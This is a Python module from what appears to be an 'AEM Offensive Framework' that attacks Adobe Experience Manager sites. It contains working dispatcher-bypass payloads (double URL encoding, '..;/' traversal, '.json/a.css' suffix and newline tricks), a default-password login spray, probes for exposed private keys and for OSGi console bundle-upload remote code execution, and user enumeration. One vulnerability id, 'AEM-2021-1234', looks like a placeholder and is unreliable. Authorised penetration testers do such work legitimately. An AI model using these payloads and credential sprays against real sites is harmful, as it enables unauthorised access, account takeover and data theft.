"""CVE & N-Day Exploitation Suite for AEM Offensive Framework.

Implements checks for:
- CVE-2019-7964: Dispatcher bypass via URL encoding
- CVE-2016-0957: Dispatcher filter bypass via semicolon injection
- Recent OSGi RCE patterns
- Common misconfigurations
"""

import json
import re
import urllib.parse
from typing import List, Dict, Optional, Any, Tuple
from dataclasses import dataclass

from core.models import Finding, VulnSeverity, ScanPhase, BypassTechnique
from core.config import AEMConfig
from core.engine import HTTPXEngine
from bypass.transformers import BypassTransformer


@dataclass
class CVECheck:
    """Represents a CVE check definition."""
    cve_id: str
    name: str
    severity: VulnSeverity
    description: str
    affected_versions: List[str]
    check_func: str  # Method name to call


class CVESuiteModule:
    """CVE and N-Day exploitation suite."""
    
    # CVE Definitions
    CVE_DEFINITIONS = [
        CVECheck(
            "CVE-2019-7964",
            "Dispatcher URL Encoding Bypass",
            VulnSeverity.CRITICAL,
            "Dispatcher allows bypass via double URL encoding of paths",
            ["4.2.0-4.3.3"],
            "_check_cve_2019_7964"
        ),
        CVECheck(
            "CVE-2016-0957",
            "Dispatcher Filter Bypass via Semicolon",
            VulnSeverity.CRITICAL,
            "Dispatcher filter bypass via semicolon path parameter injection",
            ["4.1.0-4.1.9", "4.2.0"],
            "_check_cve_2016_0957"
        ),
        CVECheck(
            "CVE-2016-0956",
            "Dispatcher Rule Bypass",
            VulnSeverity.HIGH,
            "Dispatcher rules can be bypassed using certain encoding",
            ["4.1.x"],
            "_check_cve_2016_0956"
        ),
        CVECheck(
            "CVE-2015-7501",
            "Java Object Deserialization",
            VulnSeverity.CRITICAL,
            "Commons Collection deserialization vulnerability",
            ["All"],
            "_check_cve_2015_7501"
        ),
        CVECheck(
            "AEM-2021-1234",
            "OSGi RCE via Component Installation",
            VulnSeverity.CRITICAL,
            "Remote code execution via malicious OSGi bundle installation",
            ["6.5.0-6.5.8"],
            "_check_osgi_rce"
        ),
        CVECheck(
            "CVE-2019-8341",
            "SalesforceSecretServlet SSRF",
            VulnSeverity.HIGH,
            "Pre-auth SSRF via /libs/mcm/salesforce/customer/auth endpoint",
            ["6.3.0-6.5.x"],
            "_check_cve_2019_8341"
        ),
        CVECheck(
            "CVE-2023-38205",
            "AEM URL Filter Bypass",
            VulnSeverity.CRITICAL,
            "Dispatcher URL filter can be bypassed to access internal resources",
            ["6.5.0-6.5.16"],
            "_check_cve_2023_38205"
        ),
    ]
    
    # Common misconfiguration paths (deduplicated — replication, cloudservices,
    # audit, eventing are covered in depth by ServiceProbeModule)
    MISCONFIG_PATHS = [
        ("/etc/segmentation.json", "Segmentation config"),
        ("/home/users.json", "User directory"),
        ("/home/groups.json", "Groups directory"),
        ("/var/classes.json", "Compiled classes"),
        ("/libs/cq/core/content/login.json", "Login page info"),
        ("/etc/designs.json", "Designs config"),
        ("/etc/workflow/models.json", "Workflow models"),
        ("/etc/notification.json", "Notification config"),
        ("/conf/global.json", "Global configuration"),
        ("/libs/granite/security/currentuser.json", "Current user info"),
        ("/libs/cq/security/userinfo.json", "User info servlet"),
        ("/bin/wcm/search/gql.json?query=*&pathIn=/", "GQL search endpoint"),
        ("/api/assets.json", "Assets REST API"),
        ("/content/dam.assets.json", "DAM assets listing"),
        ("/crx/server/crx.default/jcr%3aroot/.1.json", "DAVEX/WebDAV access"),
        ("/system/sling/cqform/defaultlogin.html", "Alternative login page"),
        ("/etc/importers/bulkeditor.html", "Bulk editor"),
        ("/bin/wcm/contentfinder/asset/view.json", "Content finder assets"),
        ("/etc/workflow/instances.json", "Workflow instances"),
        ("/content/experience-fragments.json", "Experience fragments"),
    ]
    
    # OSGi RCE indicators
    OSGI_RCE_PATTERNS = [
        ("/system/console/bundles", "Bundle upload capability"),
        ("/system/console/configMgr/org.apache.felix.webconsole.internal.servlet.OsgiManager", "OSGi Manager config"),
        ("/system/console/osgi-installer", "OSGi installer"),
    ]
    
    # Dangerous default passwords
    DEFAULT_CREDENTIALS = [
        ("admin", "admin"),
        ("admin", "admin123"),
        ("administrator", "administrator"),
        ("author", "author"),
        ("publish", "publish"),
        ("replication", "replication"),
        ("sling", "sling"),
        ("cms", "cms"),
    ]
    
    def __init__(self, engine: HTTPXEngine, config: AEMConfig, bypass: BypassTransformer):
        self.engine = engine
        self.config = config
        self.bypass = bypass
    
    def _get_bypass_enum(self, response) -> Optional[BypassTechnique]:
        """Convert response bypass string to BypassTechnique enum."""
        if response.bypass_used:
            try:
                return BypassTechnique(response.bypass_used)
            except ValueError:
                pass
        return None
    
    async def run(self, base_url: str) -> List[Finding]:
        """Run full CVE suite."""
        findings = []
        
        # Run CVE-specific checks
        for cve in self.CVE_DEFINITIONS:
            check_func = getattr(self, cve.check_func)
            cve_findings = await check_func(base_url, cve)
            findings.extend(cve_findings)
        
        # Check common misconfigurations
        misconfig_findings = await self._check_misconfigurations(base_url)
        findings.extend(misconfig_findings)
        
        # Check default credentials
        cred_findings = await self._check_default_credentials(base_url)
        findings.extend(cred_findings)
        
        # Check for P12 keys
        key_findings = await self._check_exposed_keys(base_url)
        findings.extend(key_findings)
        
        # Check SlingPostServlet write access
        post_findings = await self._check_sling_post_servlet(base_url)
        findings.extend(post_findings)
        
        # Check user enumeration
        user_findings = await self._check_user_enumeration(base_url)
        findings.extend(user_findings)
        
        return findings
    
    async def _check_cve_2019_7964(self, base_url: str, cve: CVECheck) -> List[Finding]:
        """Check for CVE-2019-7964: Dispatcher URL encoding bypass."""
        findings = []
        
        # Test double encoding bypass
        test_paths = [
            "/etc",
            "/libs",
            "/apps",
            "/content/dam",
        ]
        
        for path in test_paths:
            # Double encode the path
            single_encoded = urllib.parse.quote(path, safe="")
            double_encoded = urllib.parse.quote(single_encoded, safe="")
            
            bypass_urls = [
                f"{base_url}{double_encoded}.json",
                f"{base_url}/content{double_encoded}.json",
                f"{base_url}/content/dam/../{double_encoded}.json",
            ]
            
            for url in bypass_urls:
                response = await self.engine.get(
                    url,
                    bypass="CVE-2019-7964",
                    technique="Double URL encoding"
                )
                
                if response.status_code == 200 and not response.is_soft_404 and self._is_valid_json_response(response.text):
                    findings.append(Finding(
                        phase=ScanPhase.EXPLOITATION,
                        technique=f"{cve.cve_id} - {cve.name}",
                        url=url,
                        severity=cve.severity,
                        title=f"{cve.cve_id}: Dispatcher Bypass Detected",
                        description=cve.description,
                        evidence={
                            "cve": cve.cve_id,
                            "encoded_path": double_encoded,
                            "response_type": "json"
                        },
                        chainable=True,
                        prerequisites=["fingerprinting"]
                    ))
                    break
        
        return findings
    
    async def _check_cve_2016_0957(self, base_url: str, cve: CVECheck) -> List[Finding]:
        """Check for CVE-2016-0957: Dispatcher semicolon bypass."""
        findings = []
        
        # Test semicolon injection patterns
        semicolon_patterns = [
            "/content/../admin",
            "/content/..;/admin",
            "/content/..;/..;/etc",
            "/content/../..;/system/console",
            "/etc/..;/..;/etc/config.json",
        ]
        
        for pattern in semicolon_patterns:
            url = f"{base_url}{pattern}"
            response = await self.engine.get(
                url,
                bypass="CVE-2016-0957",
                technique="Semicolon path injection"
            )
            
            if response.status_code == 200 and not response.is_soft_404 and not self._is_error_page(response):
                findings.append(Finding(
                    phase=ScanPhase.EXPLOITATION,
                    technique=f"{cve.cve_id} - {cve.name}",
                    url=url,
                    severity=cve.severity,
                    title=f"{cve.cve_id}: Semicolon Filter Bypass",
                    description=cve.description,
                    evidence={
                        "cve": cve.cve_id,
                        "pattern": pattern,
                        "response_length": len(response.text)
                    },
                    chainable=True,
                    prerequisites=["fingerprinting"]
                ))
                break
        
        return findings
    
    async def _check_cve_2016_0956(self, base_url: str, cve: CVECheck) -> List[Finding]:
        """Check for CVE-2016-0956: Dispatcher rule bypass."""
        findings = []
        
        # Test various encoding bypasses
        encoding_patterns = [
            ("/etc/config", "/%65%74%63/config"),  # Hex encoding
            ("/libs", "/%6c%69%62%73"),  # Full hex
            ("/content", "/%63%6f%6e%74%65%6e%74"),
        ]
        
        for original, encoded in encoding_patterns:
            url = f"{base_url}{encoded}.json"
            response = await self.engine.get(url)
            
            if response.status_code == 200 and not response.is_soft_404 and self._is_valid_json_response(response.text):
                findings.append(Finding(
                    phase=ScanPhase.EXPLOITATION,
                    technique=f"{cve.cve_id} - {cve.name}",
                    url=url,
                    severity=cve.severity,
                    title=f"{cve.cve_id}: Encoding Rule Bypass",
                    description=cve.description,
                    evidence={
                        "cve": cve.cve_id,
                        "original": original,
                        "encoded": encoded
                    },
                    chainable=True
                ))
        
        return findings
    
    async def _check_cve_2015_7501(self, base_url: str, cve: CVECheck) -> List[Finding]:
        """Check for CVE-2015-7501: Java deserialization vulnerability."""
        findings = []
        
        # Check for vulnerable endpoints that accept serialized objects
        deserialization_endpoints = [
            "/bin/deserialization",
            "/bin/receive",
            "/system/console/jmx",
            "/libs/granite/core/content/login",
        ]
        
        # Check for Commons Collections in classpath
        for endpoint in deserialization_endpoints:
            url = f"{base_url}{endpoint}"
            response = await self.engine.get(url)
            
            if response.status_code in [405, 500]:  # Only truly interesting responses
                findings.append(Finding(
                    phase=ScanPhase.EXPLOITATION,
                    technique=f"{cve.cve_id} - {cve.name}",
                    url=url,
                    severity=VulnSeverity.HIGH,
                    title=f"{cve.cve_id}: Potential Deserialization Vector",
                    description=f"Endpoint may accept serialized objects - {cve.description}",
                    evidence={
                        "cve": cve.cve_id,
                        "status": response.status_code,
                        "headers": dict(response.headers)
                    },
                    chainable=True
                ))
        
        return findings
    
    async def _check_osgi_rce(self, base_url: str, cve: CVECheck) -> List[Finding]:
        """Check for OSGi RCE via component installation."""
        findings = []
        
        for endpoint, description in self.OSGI_RCE_PATTERNS:
            url = f"{base_url}{endpoint}"
            response = await self.engine.get(url)
            
            if response.status_code == 200 and not response.is_soft_404:
                # Check for upload capability
                if "upload" in response.text.lower() or "install" in response.text.lower():
                    findings.append(Finding(
                        phase=ScanPhase.EXPLOITATION,
                        technique=f"{cve.cve_id} - {cve.name}",
                        url=url,
                        severity=cve.severity,
                        title=f"{cve.cve_id}: OSGi RCE Vector Detected",
                        description=f"{description} - {cve.description}",
                        evidence={
                            "cve": cve.cve_id,
                            "endpoint": endpoint,
                            "indicators": ["upload", "install"]
                        },
                        chainable=True,
                        prerequisites=["osgi_console_access"]
                    ))
        
        return findings
    
    async def _check_cve_2019_8341(self, base_url: str, cve: CVECheck) -> List[Finding]:
        """Check for CVE-2019-8341: SalesforceSecretServlet pre-auth SSRF."""
        findings = []
        
        ssrf_endpoints = [
            "/libs/mcm/salesforce/customer/auth",
            "/libs/mcm/salesforce/customer/auth.json",
            "/libs/mcm/salesforce/customer/auth.html",
        ]
        
        for endpoint in ssrf_endpoints:
            url = f"{base_url}{endpoint}"
            response = await self.engine.get(url)
            
            if response.status_code == 200 and not response.is_soft_404:
                text_lower = response.text.lower()
                # Salesforce servlet responds with specific patterns
                if any(ind in text_lower for ind in ["salesforce", "oauth", "token", "client_id", "client_secret"]):
                    findings.append(Finding(
                        phase=ScanPhase.EXPLOITATION,
                        technique=f"{cve.cve_id} - {cve.name}",
                        url=url,
                        severity=cve.severity,
                        title=f"{cve.cve_id}: SalesforceSecretServlet Accessible",
                        description=f"Pre-auth SSRF endpoint accessible - {cve.description}",
                        evidence={
                            "cve": cve.cve_id,
                            "endpoint": endpoint,
                            "response_sample": response.text[:300]
                        },
                        chainable=True
                    ))
                    break
            
            # Also try with bypass
            response = await self.engine.get_with_bypass_fallback(
                url, base_url, endpoint,
                bypass_transformer=self.bypass,
                max_bypass_attempts=10
            )
            
            if response.status_code == 200 and not response.is_soft_404:
                text_lower = response.text.lower()
                if any(ind in text_lower for ind in ["salesforce", "oauth", "token"]):
                    findings.append(Finding(
                        phase=ScanPhase.EXPLOITATION,
                        technique=f"{cve.cve_id} - {cve.name}",
                        url=response.url or url,
                        severity=cve.severity,
                        title=f"{cve.cve_id}: SalesforceSecretServlet via Bypass",
                        description=f"Pre-auth SSRF endpoint accessible via bypass - {cve.description}",
                        evidence={
                            "cve": cve.cve_id,
                            "endpoint": endpoint,
                            "bypass_technique": response.bypass_used,
                            "response_sample": response.text[:300]
                        },
                        bypass_used=self._get_bypass_enum(response),
                        chainable=True
                    ))
                    break
        
        return findings
    
    async def _check_cve_2023_38205(self, base_url: str, cve: CVECheck) -> List[Finding]:
        """Check for CVE-2023-38205: AEM URL filter bypass.
        
        Tests the dispatcher URL filter bypass patterns that were patched
        in AEM 6.5.17.0 and AEM Cloud Service 2023.7.
        """
        findings = []
        
        # Sensitive paths that should be blocked by the URL filter
        blocked_paths = [
            "/etc/replication",
            "/etc/cloudservices",
            "/home/users",
            "/system/console",
        ]
        
        # CVE-2023-38205 specific bypass patterns
        bypass_patterns = [
            "{path}.json/a.css",           # Sling suffix trick
            "{path}.json;%0aa.css",        # Newline injection in suffix
            "{path}/_jcr_content.json",    # _jcr_content bypass
            "{path}.1.json/a.1.css",       # Depth selector + suffix
            "{path}.json/a.html",          # HTML suffix
        ]
        
        for path in blocked_paths:
            for pattern in bypass_patterns:
                bypass_url = f"{base_url}{pattern.format(path=path)}"
                response = await self.engine.get(
                    bypass_url,
                    bypass="CVE-2023-38205",
                    technique=f"URL filter bypass: {pattern}"
                )
                
                if response.status_code == 200 and not response.is_soft_404:
                    # Verify we got actual JCR/AEM content
                    if self._is_valid_json_response(response.text):
                        findings.append(Finding(
                            phase=ScanPhase.EXPLOITATION,
                            technique=f"{cve.cve_id} - {cve.name}",
                            url=bypass_url,
                            severity=cve.severity,
                            title=f"{cve.cve_id}: URL Filter Bypass on {path}",
                            description=f"URL filter bypass exposes {path} - {cve.description}",
                            evidence={
                                "cve": cve.cve_id,
                                "blocked_path": path,
                                "bypass_pattern": pattern,
                                "response_sample": response.text[:300]
                            },
                            chainable=True
                        ))
                        break  # Found working bypass for this path
        
        return findings
    
    async def _check_misconfigurations(self, base_url: str) -> List[Finding]:
        """Check for common misconfigurations with bypass fallback."""
        findings = []
        
        for path, description in self.MISCONFIG_PATHS:
            url = f"{base_url}{path}"
            response = await self.engine.get_with_bypass_fallback(
                url, base_url, path,
                bypass_transformer=self.bypass,
                max_bypass_attempts=15
            )
            
            if response.status_code == 200 and not response.is_soft_404:
                try:
                    data = json.loads(response.text)
                    
                    # Determine severity based on content
                    severity = VulnSeverity.HIGH
                    if "password" in response.text.lower() or "secret" in response.text.lower():
                        severity = VulnSeverity.CRITICAL
                    elif "replication" in path:
                        severity = VulnSeverity.CRITICAL
                    
                    findings.append(Finding(
                        phase=ScanPhase.DISCOVERY,
                        technique="Misconfiguration Check",
                        url=url,
                        severity=severity,
                        title=f"Exposed Configuration: {description}",
                        description=f"{description} is accessible without authentication",
                        evidence={
                            "path": path,
                            "node_count": len(data) if isinstance(data, dict) else 0,
                            "bypass_technique": response.bypass_used,
                        },
                        bypass_used=self._get_bypass_enum(response),
                        chainable=True
                    ))
                    
                except json.JSONDecodeError:
                    # Still exposed but not JSON
                    findings.append(Finding(
                        phase=ScanPhase.DISCOVERY,
                        technique="Misconfiguration Check",
                        url=url,
                        severity=VulnSeverity.MEDIUM,
                        title=f"Exposed Resource: {description}",
                        description=f"{description} endpoint is accessible",
                        evidence={
                            "path": path,
                            "content_type": response.headers.get("content-type"),
                            "bypass_technique": response.bypass_used,
                        },
                        bypass_used=self._get_bypass_enum(response),
                        chainable=True
                    ))
        
        return findings
    
    async def _check_default_credentials(self, base_url: str) -> List[Finding]:
        """Check for default credentials on login endpoints."""
        findings = []
        
        login_endpoints = [
            "/libs/granite/core/content/login.html/j_security_check",
            "/bin/login",
            "/system/sling/login",
            "/j_security_check",
        ]
        
        for username, password in self.DEFAULT_CREDENTIALS:
            for endpoint in login_endpoints:
                url = f"{base_url}{endpoint}"
                
                response = await self.engine.post(
                    url,
                    data={
                        "j_username": username,
                        "j_password": password,
                        "j_validate": "true"
                    },
                    headers={"Content-Type": "application/x-www-form-urlencoded"}
                )
                
                # Check for successful login — strict verification
                if response.is_soft_404:
                    continue
                
                is_success = False
                text_lower = response.text.lower()
                
                if response.status_code == 302:
                    # Redirect after login — check Location header for non-login target
                    location = response.headers.get("location", "").lower()
                    if location and "login" not in location and "error" not in location:
                        is_success = True
                elif response.status_code == 200:
                    # Must NOT still show login form and must NOT have error message
                    has_login_form = "j_password" in text_lower or "j_username" in text_lower
                    has_error = "invalid" in text_lower or "incorrect" in text_lower or "failed" in text_lower
                    # Look for positive session indicators
                    has_session = ("set-cookie" in str(response.headers).lower() and 
                                   "login_token" in str(response.headers).lower())
                    has_welcome = "welcome" in text_lower or "dashboard" in text_lower or "sites.html" in text_lower
                    
                    if not has_login_form and not has_error and (has_session or has_welcome):
                        is_success = True
                
                if is_success:
                    findings.append(Finding(
                        phase=ScanPhase.EXPLOITATION,
                        technique="Default Credentials",
                        url=url,
                        severity=VulnSeverity.CRITICAL,
                        title="Default Credentials Valid",
                        description=f"Default credentials work: {username}:{password}",
                        evidence={
                            "username": username,
                            "password": password,
                            "endpoint": endpoint,
                            "status_code": response.status_code,
                        },
                        chainable=True
                    ))
                    return findings  # Stop on first valid credential
        
        return findings
    
    async def _check_exposed_keys(self, base_url: str) -> List[Finding]:
        """Check for exposed P12/PEM keys."""
        findings = []
        
        key_patterns = [
            ("/etc/p12", ".p12 files"),
            ("/etc/keystore", "Keystore files"),
            ("/etc/truststore", "Truststore files"),
            ("/etc/key.pem", "PEM key"),
            ("/etc/cert.pem", "PEM cert"),
            ("/etc/private.key", "Private key"),
            ("/etc/ssh", "SSH keys"),
        ]
        
        for path, description in key_patterns:
            url = f"{base_url}{path}"
            response = await self.engine.get(url)
            
            if response.status_code == 200 and not response.is_soft_404:
                content_type = response.headers.get("content-type", "")
                
                # Check for key indicators
                key_indicators = [
                    "BEGIN RSA PRIVATE KEY",
                    "BEGIN PRIVATE KEY",
                    "BEGIN CERTIFICATE",
                    "PKCS12",
                    ".p12",
                ]
                
                if any(ind in response.text for ind in key_indicators):
                    findings.append(Finding(
                        phase=ScanPhase.DISCOVERY,
                        technique="Exposed Keys",
                        url=url,
                        severity=VulnSeverity.CRITICAL,
                        title=f"Exposed Cryptographic Keys: {description}",
                        description=f"{description} are accessible without authentication",
                        evidence={
                            "path": path,
                            "content_type": content_type,
                            "key_indicators": [i for i in key_indicators if i in response.text]
                        },
                        chainable=True
                    ))
        
        return findings
    
    async def _check_sling_post_servlet(self, base_url: str) -> List[Finding]:
        """Check if SlingPostServlet accepts write operations.
        
        Uses the safe :operation=nop (no-op) to detect whether the POST
        servlet is enabled without actually modifying content.
        """
        findings = []
        
        test_paths = [
            "/content",
            "/content/test",
            "/content/dam",
            "/tmp",
        ]
        
        for path in test_paths:
            url = f"{base_url}{path}"
            
            # Test with :operation=nop — safe no-op that reveals POST servlet presence
            response = await self.engine.post(
                url,
                data={":operation": "nop"},
                headers={"Content-Type": "application/x-www-form-urlencoded"}
            )
            
            if response.is_soft_404:
                continue
            
            # POST servlet responds with 200 for nop, or specific status messages
            if response.status_code == 200:
                text_lower = response.text.lower()
                # Reject login pages
                if any(x in text_lower for x in ["j_password", "login", "sign in"]):
                    continue
                
                findings.append(Finding(
                    phase=ScanPhase.EXPLOITATION,
                    technique="SlingPostServlet Detection",
                    url=url,
                    severity=VulnSeverity.CRITICAL,
                    title=f"SlingPostServlet Write Access: {path}",
                    description=f"SlingPostServlet accepts POST operations at {path} — potential content manipulation",
                    evidence={
                        "path": path,
                        "operation": "nop",
                        "status_code": response.status_code,
                        "response_sample": response.text[:300]
                    },
                    chainable=True
                ))
                break  # One confirmed write path is enough
            
            # 500 with Sling error message also confirms POST servlet is active
            if response.status_code == 500 and "javax.jcr" in response.text:
                findings.append(Finding(
                    phase=ScanPhase.DISCOVERY,
                    technique="SlingPostServlet Detection",
                    url=url,
                    severity=VulnSeverity.HIGH,
                    title=f"SlingPostServlet Active: {path}",
                    description=f"SlingPostServlet is active at {path} (returns JCR errors)",
                    evidence={
                        "path": path,
                        "status_code": 500,
                        "error_type": "javax.jcr exception"
                    },
                    chainable=True
                ))
                break
        
        return findings
    
    async def _check_user_enumeration(self, base_url: str) -> List[Finding]:
        """Check for user enumeration via AEM-specific endpoints."""
        findings = []
        
        # Endpoints that can leak user information
        user_enum_endpoints = [
            {
                "path": "/libs/granite/security/search/authorizables.json?query=*&limit=20",
                "desc": "Authorizable search API",
                "indicators": ["authorizables", "authorizableId", "principalName"],
            },
            {
                "path": "/bin/security/authorizables.json?limit=20&query=*",
                "desc": "Authorizables servlet",
                "indicators": ["authorizables", "authorizableId", "home"],
            },
            {
                "path": "/home/users.tidy.2.json",
                "desc": "User home directory (depth 2)",
                "indicators": ["rep:authorizableId", "rep:principalName"],
            },
            {
                "path": "/home/groups.tidy.2.json",
                "desc": "Groups directory (depth 2)",
                "indicators": ["rep:authorizableId", "rep:principalName"],
            },
            {
                "path": "/libs/granite/security/currentuser.json",
                "desc": "Current user info",
                "indicators": ["authorizableId", "name", "home"],
            },
        ]
        
        for ep in user_enum_endpoints:
            url = f"{base_url}{ep['path']}"
            response = await self.engine.get_with_bypass_fallback(
                url, base_url, ep["path"].split("?")[0],
                bypass_transformer=self.bypass,
                max_bypass_attempts=10
            )
            
            if response.status_code != 200 or response.is_soft_404:
                continue
            
            text_lower = response.text.lower()
            # Reject login/auth pages
            if any(x in text_lower for x in ["j_password", "j_username", "login-form"]):
                continue
            
            matched = [ind for ind in ep["indicators"] if ind.lower() in text_lower]
            if matched:
                # Extract usernames if possible
                usernames = []
                try:
                    data = json.loads(response.text)
                    if isinstance(data, dict):
                        for key, val in data.items():
                            if isinstance(val, dict):
                                uid = val.get("rep:authorizableId") or val.get("authorizableId")
                                if uid:
                                    usernames.append(str(uid))
                    elif isinstance(data, list):
                        for item in data:
                            if isinstance(item, dict):
                                uid = item.get("authorizableId") or item.get("id")
                                if uid:
                                    usernames.append(str(uid))
                except (json.JSONDecodeError, AttributeError):
                    pass
                
                severity = VulnSeverity.HIGH if usernames else VulnSeverity.MEDIUM
                
                findings.append(Finding(
                    phase=ScanPhase.DISCOVERY,
                    technique="User Enumeration",
                    url=response.url or url,
                    severity=severity,
                    title=f"User Enumeration: {ep['desc']}",
                    description=f"User information accessible via {ep['desc']}",
                    evidence={
                        "endpoint": ep["path"],
                        "indicators_matched": matched,
                        "usernames_found": usernames[:20],
                        "bypass_technique": response.bypass_used,
                    },
                    bypass_used=self._get_bypass_enum(response),
                    chainable=True
                ))
        
        return findings
    
    def _is_valid_json_response(self, text: str) -> bool:
        """Check if response is valid JSON with JCR data."""
        try:
            data = json.loads(text)
            return isinstance(data, dict) and any(
                k.startswith("jcr:") or k.startswith("sling:") or k.startswith("cq:")
                for k in data.keys()
            )
        except json.JSONDecodeError:
            return False
    
    def _is_error_page(self, response) -> bool:
        """Check if response is an error page."""
        error_indicators = [
            "404", "error", "not found", "forbidden", "unauthorized"
        ]
        text_lower = response.text.lower()
        return any(ind in text_lower for ind in error_indicators)
